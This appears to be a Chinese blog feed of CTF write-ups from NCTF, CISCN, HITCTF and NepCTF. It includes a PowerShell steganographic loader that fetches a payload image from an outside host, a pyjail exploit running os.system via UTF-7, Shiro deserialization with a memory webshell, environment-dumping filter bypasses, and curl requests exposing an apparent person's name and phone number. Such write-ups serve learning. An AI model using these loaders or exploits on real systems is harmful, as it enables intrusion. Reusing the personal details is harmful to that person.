<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((aNet.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[]</span><br><span class="line"><span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125;</span><br><span class="line">&#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
<p>运行成功后得到以下这段</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOMpReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
<p>看起来明显不对劲，字符很奇怪，很明显进行了混淆，实际比赛也是卡在了这里</p>
<p>查询了一下<code>&amp;((GV '*mdR*').NaMe[3,11,2]-JoIN'') </code></p>
<p>这是一种powershell反混淆技术，<a href="https://www.securonix.com/blog/hiding-the-powershell-execution-flow/">Securonix 威胁研究知识共享系列：隐藏 PowerShell 执行流 - Securonix</a></p>
<p>实际上约等于IEX</p>
<p>因此还是需要修改成echo输出</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOM</span></span><br><span class="line"><span class="type">pReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
<p>以此类推</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="string">&#x27;自行填充&#x27;</span>.sPLIt( <span class="string">&#x27;&lt;r_l:&#123;&amp;Z&#x27;</span> ) | %&#123; ([<span class="type">cOnVErt</span>]::toInt16( ([<span class="built_in">strING</span>]<span class="variable">$_</span> ) , <span class="number">16</span> )<span class="operator">-aS</span>[<span class="built_in">cHAr</span>])&#125; ) <span class="operator">-JOIN</span> <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> (([<span class="type">rUNtiME.INTERoPsERvIceS.MaRshal</span>]::PTRtOstrinGBsTr([<span class="type">runtIme.INTeRopSeRviCES.mARShAl</span>]::seCUResTrInGTObsTR(<span class="variable">$</span>(<span class="string">&#x27;自行填充&#x27;</span> | <span class="built_in">conVeRtto-SEcurEsTrIng</span> <span class="literal">-key</span> (<span class="number">143</span>..<span class="number">112</span>))) ) ) ) <span class="operator">-JOIN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终得到原始脚本，获得flag</p>
<h3 id="NCTF2077-slivery">NCTF2077: slivery</h3>
<p><strong>考点：</strong></p>
<p>首先在镜像文件中我们可以直接提取出一个flag.zip</p>
<p>sliver-c2流量解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_pcap_parser.py --pcap dump.pcapng --filter http --domain_name 192.168.207.128</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_decrypt.py --transport http --file_path ./http-sessions.json --force minidump.dmp</span><br></pre></td></tr></table></figure>
<p>P@33w000000rd_U_GOT解压压缩包</p>
<h3 id="ezjail">ezjail</h3>
<p><strong>考点：pyjail，UTF-7字符集利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import b64encode</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"># s = process([&quot;python3&quot;,&quot;server.py&quot;])</span><br><span class="line">s = remote(&quot;node4.anna.nssctf.cn&quot;,28506)</span><br><span class="line">s.sendline(&quot;e&quot;)</span><br><span class="line">s.recvuntil(&quot; &gt; &quot;)</span><br><span class="line">#ls_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="line">cat_flag_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat f*&#x27;)&quot;</span><br><span class="line">#s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(ls_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(cat_flag_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>暂无环境，所以本题关注原理</p>
<p>本题最开始显示的是⽩名单限制了特殊字符只有 +=#\r\n</p>
<p>当时实际做的时候挺接近了，也想到了这一点，但是没有考虑到换行的问题</p>
<h3 id="randommaker">randommaker</h3>
<p><strong>考点：测信道</strong></p>
<p>暂保留，不懂测信道</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023Ciscn-Writeup</title>
    <url>/2023/09/28/2023Ciscn-Writeup/</url>
    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到卡">签到卡</h3>
<p><strong>考点：签到</strong></p>
<p>前往公众号查看提示</p>
<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
<p>print(open(‘/flag’).read())</p>
<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
<h3 id="被加密的生产流量">被加密的生产流量</h3>
<p><strong>考点：Modbus协议</strong></p>
<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
<p>将字符串进行base32编码，得到flag</p>
<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
<h3 id="国粹">国粹</h3>
<p><strong>考点：图片识别</strong></p>
<p>下载附件给出了三个图</p>
<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
<p>得到最终的flag为flag{202305012359}</p>
<h2 id="crypto">crypto</h2>
<h3 id="国密">国密</h3>
<p><strong>考点：可信计算</strong></p>
<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
<p>首先发送</p>
<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
<p>得到用户id</p>
<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
<p>生成SM2算法的公钥和密钥</p>
<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
<p>发送公钥</p>
<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
<p>得到结果</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>将随机数C密文采用SM2算法解密，得到结果</p>
<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
<p>向服务器请求密钥，得到回应</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
<p>发送验证，得到flag</p>
<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
<p><strong>考点：换表base64</strong></p>
<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023HITCTF-Misc-Writeup</title>
    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
<h2 id="前言">前言</h2>
<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
<h2 id="leftover-file">leftover file</h2>
<p><strong>考点：Modbus协议，变异凯撒</strong></p>
<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
<p>发现response存在异常</p>
<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
<p>然后每次的功能码3，进行一次新的修改操作</p>
<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
<p>到90 93发现flag已经格式完整</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
<p>单纯菜，qwq~~</p>
<h2 id="network-in-network">network-in-network</h2>
<p><strong>考点：神经网络逆向</strong></p>
<p>先来看一下官方给的</p>
<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
<p>我再研究研究，qwq</p>
<h2 id="H1F1">H1F1</h2>
<p><strong>考点：音频反向</strong></p>
<p>这道题就讲一下思路吧，不想动手复现了</p>
<p>根据官方wp和吉大师傅的简单操作了一下</p>
<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
<p>只能说学到了一个新的知识：音频diff</p>
<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
<p>可以发现下图的怪异bit点</p>
<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
<p>进行读取二进制0和1，最后转字符串就行了</p>
<h2 id="总结">总结</h2>
<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
<p>出题人太懂出题了（悲</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NepNep-Writeup</title>
    <url>/2023/09/29/2023NepNep-Writeup/</url>
    <content><![CDATA[<h1>2023NepNep-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="ez-java-checkin">ez_java_checkin</h3>
<p><strong>考点：shiro反序列化</strong></p>
<p>提示管理员登陆，admin默认</p>
<p><img src="https://s2.loli.net/2023/09/29/eTOApcdyrMXtwzR.png" alt=""></p>
<p>发现rememberMe=deleteMe，查询找到相关漏洞</p>
<p>工具一把梭</p>
<p><img src="https://s2.loli.net/2023/09/29/zTWpvLM6VZRPdxO.png" alt=""></p>
<p>注入内存马</p>
<p><img src="https://s2.loli.net/2023/09/29/VIqdTD8banlQ3uX.png" alt=""></p>
<p>连接webshell</p>
<p><img src="https://s2.loli.net/2023/09/29/w2NgWBtjGOxZAHU.png" alt=""></p>
<p>开始寻找flag，在start.sh中找到</p>
<p><img src="https://s2.loli.net/2023/09/29/s4phrUitKWZTBvN.png" alt=""></p>
<h2 id="Misc">Misc</h2>
<h3 id="CheckIn">CheckIn</h3>
<p><strong>考点：签到</strong></p>
<p><img src="https://s2.loli.net/2023/09/29/TWKFvQROpV9ySxu.png" alt=""></p>
<h3 id="与AI共舞的哈夫曼">与AI共舞的哈夫曼</h3>
<p><strong>考点：哈夫曼算法</strong></p>
<p>给的是一段压缩算法，根据提示交给chtgpt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import heapq</span><br><span class="line"></span><br><span class="line">class HuffmanNode:</span><br><span class="line">    def __init__(self, char, freq):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = None</span><br><span class="line">        self.right = None</span><br><span class="line"></span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line">def build_huffman_tree(frequencies):</span><br><span class="line">    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    while len(heap) &gt; 1:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(None, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    return heap[0]</span><br><span class="line"></span><br><span class="line">def decompress(input_file, output_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    num_symbols = data[0]</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    offset = 1</span><br><span class="line"></span><br><span class="line">    for i in range(num_symbols):</span><br><span class="line">        byte = data[offset]</span><br><span class="line">        freq = (data[offset + 1] &lt;&lt; 24) | (data[offset + 2] &lt;&lt; 16) | (data[offset + 3] &lt;&lt; 8) | data[offset + 4]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        offset += 5</span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    decoded_data = &#x27;&#x27;</span><br><span class="line">    current_node = root</span><br><span class="line"></span><br><span class="line">    for byte in data[offset:]:</span><br><span class="line">        bits = bin(byte)[2:].rjust(8, &#x27;0&#x27;)</span><br><span class="line">        for bit in bits:</span><br><span class="line">            if bit == &#x27;0&#x27;:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            else:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            if current_node.char is not None:</span><br><span class="line">                decoded_data += chr(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        f.write(decoded_data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    compressed_file = &#x27;compressed.bin&#x27;</span><br><span class="line">    decompressed_file = &#x27;decompressed.txt&#x27;</span><br><span class="line"></span><br><span class="line">    # 解压缩文件</span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/29/o5xBwTz7MJUCFi2.png" alt=""></p>
<h3 id="小叮弹钢琴">小叮弹钢琴</h3>
<p><strong>考点：xor</strong></p>
<p>首先给的一段音频，用Au打开，发现包含两个内容，一个明显是十六制数字，另外一个怀疑是摩斯密码，手写下来解码得到一段明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YOUSHOULDUSETHISTOXORSOMETHING</span><br></pre></td></tr></table></figure>
<p>根据提示，考虑异或解密，手搓了一段脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher_text_hex = &quot;0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&quot;</span><br><span class="line">cipher_text_bytes = bytes.fromhex(cipher_text_hex[2:])</span><br><span class="line">key = &quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span><br><span class="line">key_bytes = key.encode()</span><br><span class="line">plain_text_bytes = bytearray(len(cipher_text_bytes))</span><br><span class="line"></span><br><span class="line">for i in range(len(cipher_text_bytes)):</span><br><span class="line">    plain_text_bytes[i] = cipher_text_bytes[i] ^ key_bytes[i % len(key_bytes)]</span><br><span class="line"></span><br><span class="line">decrypted_text = plain_text_bytes.decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Decrypted Text:&quot;, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是解下来出现了nep字样，但是字符不对劲</p>
<p><img src="https://s2.loli.net/2023/09/29/FoR42QkXEf7JsSh.png" alt=""></p>
<p>然后用CyberChef一把梭，得到了结果</p>
<p><img src="https://s2.loli.net/2023/09/29/DpPRqJvEW8SImNB.png" alt=""></p>
<p>应该是脚本存在问题，但是代码能力有限，真想不出来了，等赛后wp吧</p>
<h3 id="codes">codes</h3>
<p><strong>考点：C++ 绕过</strong></p>
<p>根据提示，flag在环境变量中</p>
<p>根据查找，有一下几种方法</p>
<ol>
<li>
<p><strong>使用 <code>extern char **environ</code> 全局变量：</strong></p>
<p>这是一种直接的方法，使用全局变量 <code>environ</code>，它是一个指向指针的指针，用于存储环境变量的字符串数组。遍历这个数组并打印环境变量的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>getenv()</code> 函数：</strong></p>
<p><code>getenv()</code> 函数允许你通过指定环境变量名称来获取其值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* env_var_name = <span class="string">&quot;PATH&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* env_var_value = getenv(env_var_name);</span><br><span class="line">    <span class="keyword">if</span> (env_var_value != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s=%s\n&quot;</span>, env_var_name, env_var_value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Environment variable &#x27;%s&#x27; not found.\n&quot;</span>, env_var_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>使用 <code>main()</code> 函数的参数 <code>char *argv[]</code>：</strong></p>
<p>程序的启动参数中也包含了环境变量信息。这种方法需要一些额外的解析工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (envp[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>逐个尝试，全部失败了</p>
<p>开始尝试各种绕过姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern char **en\</span><br><span class="line">viron;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (en\</span><br><span class="line">viron[i] != NULL) &#123;</span><br><span class="line">        printf(&quot;%s\n&quot;, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nepctf&#123;easy_codes_3a5786c2-dd96-46bd-9909-23f894dc8d2a_[TEAM_HASH]&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ConnectedFive">ConnectedFive</h3>
<p><strong>考点：象棋</strong></p>
<p><img src="https://s2.loli.net/2023/09/29/DIuOpeSJkYsTxWf.png" alt=""></p>
<p>万宁，果真折磨</p>
<h3 id="陌生的语言">陌生的语言</h3>
<p><strong>考点：龙语文字，月亮魔法文字</strong></p>
<p>没啥好说的，上图，比较好奇出题人到底是怎么找到的这个图</p>
<p><img src="https://s2.loli.net/2023/09/29/ifCgDS2O9Jzdw1y.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/29/wofOdTlQaR38XpE.png" alt=""></p>
<p>然后将对应一下，最终成功提交上去的flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure>
<h3 id="你也喜欢三月七么">你也喜欢三月七么</h3>
<p><strong>考点：AES，星穹铁道文字解密</strong></p>
<p>拿到手刚开始以为这个题是密码的，当然，也确实有部分是，但主要可能是考察阅读理解。我还想再说一句，星穹铁道，启动！</p>
<p>首先先来看一下附件给了我们什么内容</p>
